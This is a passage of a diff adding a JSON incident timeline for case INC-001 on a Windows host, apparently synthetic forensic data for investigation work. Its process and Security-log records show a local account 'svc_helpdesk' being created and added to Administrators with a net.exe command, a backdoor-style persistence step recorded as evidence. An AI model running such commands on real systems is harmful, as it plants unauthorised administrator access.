+        "sha256": "b10b131c0cb09573f36977422860f39cdb5934055ce424e782c2fb2b150d0f8e",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00029",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0008",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:35:20Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "channel": "Security",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48220,
+        "sam_account_name": "svc_helpdesk",
+        "subject_domain": "WIN-PC-01",
+        "target_domain": "WIN-PC-01",
+        "target_sid": "S-1-5-21-1000000001-2000000002-3000000003-1004",
+        "target_user": "svc_helpdesk",
+        "target_user_context": {
+          "account_type": "local",
+          "created_at": "2026-10-08T07:35:22Z",
+          "enabled": true,
+          "evidence_id": "USR-0006",
+          "groups": [
+            "Administrators"
+          ],
+          "is_admin": true,
+          "username": "svc_helpdesk"
+        },
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4720
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00030",
+      "event_type": "account_created",
+      "evidence_id": "EVL-0011",
+      "source": "events",
+      "timestamp": "2026-10-08T07:35:22Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "net.exe localgroup Administrators svc_helpdesk /add",
+        "executable_path": "C:\\Windows\\System32\\net.exe",
+        "name": "net.exe",
+        "origin": "event_log",
+        "parent_name": "powershell.exe",
+        "pid": 6290,
+        "ppid": 6188,
+        "sha256": "b10b131c0cb09573f36977422860f39cdb5934055ce424e782c2fb2b150d0f8e",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00031",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0009",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:35:30Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "channel": "Security",
+        "group": "Administrators",
+        "group_domain": "Builtin",
+        "member": "WIN-PC-01\\svc_helpdesk",
+        "member_name": "svc_helpdesk",
+        "member_sid": "S-1-5-21-1000000001-2000000002-3000000003-1004",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48221,
+        "subject_domain": "WIN-PC-01",
+        "target_user_context": {
+          "account_type": "local",
+          "created_at": "2026-10-08T07:35:22Z",
+          "enabled": true,
+          "evidence_id": "USR-0006",
+          "groups": [
+            "Administrators"
+          ],
+          "is_admin": true,
+          "username": "svc_helpdesk"
+        },
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4732
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00032",
+      "event_type": "group_member_added",
+      "evidence_id": "EVL-0012",
+      "source": "events",
+      "timestamp": "2026-10-08T07:35:31Z",
+      "user": "ahmed"
+    }
+  ],
+  "users_involved": [
+    "ahmed",
+    "svc_backup"
+  ]
+}
